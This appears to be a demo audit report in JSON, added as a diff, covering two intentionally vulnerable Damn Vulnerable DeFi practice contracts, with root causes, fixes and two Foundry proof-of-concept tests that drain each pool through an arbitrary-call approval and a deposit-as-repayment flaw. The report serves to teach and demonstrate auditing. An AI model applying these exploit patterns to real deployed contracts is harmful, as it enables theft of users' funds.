@@ -1,0 +1,74 @@
+{
+  "commit": "64fddf9f96de2782f8868898d68673acb295119c",
+  "reportDate": "2026-11-17",
+  "summary": "Demo findings, written for Crow's demo page at crow.direct/demo. The repository is Damn Vulnerable DeFi v4, a set of contracts written to be broken for practice; these findings describe the flaws its exercises were built to hold and make no claim about any deployed project. The review covered the two files in scope at the commit above and reports two Critical findings and one Info note.",
+  "filesReviewed": [
+    "src/truster/TrusterLenderPool.sol",
+    "src/side-entrance/SideEntranceLenderPool.sol"
+  ],
+  "findings": [
+    {
+      "id": "F-01",
+      "severity": "Critical",
+      "status": "open",
+      "title": "Demo finding: flashLoan() makes any call the borrower names, from the pool",
+      "locations": [
+        {
+          "file": "src/truster/TrusterLenderPool.sol",
+          "lines": { "start": 20, "end": 35 },
+          "excerpt": "token.transfer(borrower, amount);\ntarget.functionCall(data);"
+        }
+      ],
+      "rootCause": "flashLoan() calls target with data, both chosen by the caller, on line 28. The call runs with the pool as msg.sender, so it can do anything the pool may do, such as approve a spender for the pool's tokens. The balance check on line 30 passes, since an approval moves no tokens.",
+      "impact": "Anyone can take a loan of 0 tokens whose call approves their own address for the pool's whole balance, then move every token out with transferFrom. No special access is needed.",
+      "recommendedFix": "Remove the arbitrary call. Call a fixed callback on the borrower, such as the ERC-3156 onFlashLoan, and never let the caller choose the target or the data.",
+      "pocFiles": [
+        {
+          "path": "test/poc/F-01-truster-approve.t.sol",
+          "content": "// SPDX-License-Identifier: MIT\n// Demo proof of concept for crow.direct/demo.\npragma solidity =0.8.25;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {DamnValuableToken} from \"../../src/DamnValuableToken.sol\";\nimport {TrusterLenderPool} from \"../../src/truster/TrusterLenderPool.sol\";\n\ncontract TrusterApproveTest is Test {\n    function test_anyoneTakesThePool() public {\n        DamnValuableToken token = new DamnValuableToken();\n        TrusterLenderPool pool = new TrusterLenderPool(token);\n        token.transfer(address(pool), 1_000_000e18);\n        address attacker = makeAddr(\"attacker\");\n\n        vm.startPrank(attacker);\n        pool.flashLoan(0, attacker, address(token), abi.encodeCall(token.approve, (attacker, 1_000_000e18)));\n        token.transferFrom(address(pool), attacker, 1_000_000e18);\n        vm.stopPrank();\n\n        assertEq(token.balanceOf(address(pool)), 0);\n        assertEq(token.balanceOf(attacker), 1_000_000e18);\n    }\n}\n"
+        }
+      ]
+    },
+    {
+      "id": "F-02",
+      "severity": "Critical",
+      "status": "open",
+      "title": "Demo finding: a flash loan repaid through deposit() becomes the borrower's balance",
+      "locations": [
+        {
+          "file": "src/side-entrance/SideEntranceLenderPool.sol",
+          "lines": { "start": 35, "end": 43 },
+          "excerpt": "IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();\n\nif (address(this).balance < balanceBefore) {\n    revert RepayFailed();\n}"
+        },
+        {
+          "file": "src/side-entrance/SideEntranceLenderPool.sol",
+          "lines": { "start": 19, "end": 24 }
+        }
+      ],
+      "rootCause": "flashLoan() counts the loan as repaid when the pool's ether balance is back to where it was, on line 40. A borrower that sends the loan back through deposit() restores the balance and is also credited it in balances, so the same ether counts twice.",
+      "impact": "Anyone can borrow the pool's whole balance, deposit it back inside execute(), and then withdraw it as their own. No special access is needed.",
+      "recommendedFix": "Track repayment apart from deposits: refuse deposit() while a loan is open, or require repayment through a dedicated call and compare the deposits' total before and after the loan.",
+      "pocFiles": [
+        {
+          "path": "test/poc/F-02-side-entrance-deposit.t.sol",
+          "content": "// SPDX-License-Identifier: MIT\n// Demo proof of concept for crow.direct/demo.\npragma solidity =0.8.25;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {SideEntranceLenderPool} from \"../../src/side-entrance/SideEntranceLenderPool.sol\";\n\ncontract Borrower {\n    SideEntranceLenderPool private immutable pool;\n\n    constructor(SideEntranceLenderPool p) {\n        pool = p;\n    }\n\n    function run() external {\n        pool.flashLoan(address(pool).balance);\n        pool.withdraw();\n    }\n\n    function execute() external payable {\n        pool.deposit{value: msg.value}();\n    }\n\n    receive() external payable {}\n}\n\ncontract SideEntranceDepositTest is Test {\n    function test_anyoneTakesThePool() public {\n        SideEntranceLenderPool pool = new SideEntranceLenderPool();\n        vm.deal(address(this), 1000 ether);\n        pool.deposit{value: 1000 ether}();\n\n        Borrower borrower = new Borrower(pool);\n        borrower.run();\n\n        assertEq(address(pool).balance, 0);\n        assertEq(address(borrower).balance, 1000 ether);\n    }\n}\n"
+        }
+      ]
+    },
+    {
+      "id": "F-03",
+      "severity": "Info",
+      "status": "open",
+      "title": "Demo finding: flashLoan() emits no event",
+      "locations": [
+        {
+          "file": "src/side-entrance/SideEntranceLenderPool.sol",
+          "lines": { "start": 35, "end": 43 }
+        }
+      ],
+      "rootCause": "deposit() and withdraw() emit events, and flashLoan() emits none.",
+      "impact": "Monitoring that reads the pool's events cannot see loans, which makes the abuse in F-02 harder to spot.",
+      "recommendedFix": "Emit an event with the borrower and the amount in flashLoan()."
+    }
+  ]
+}
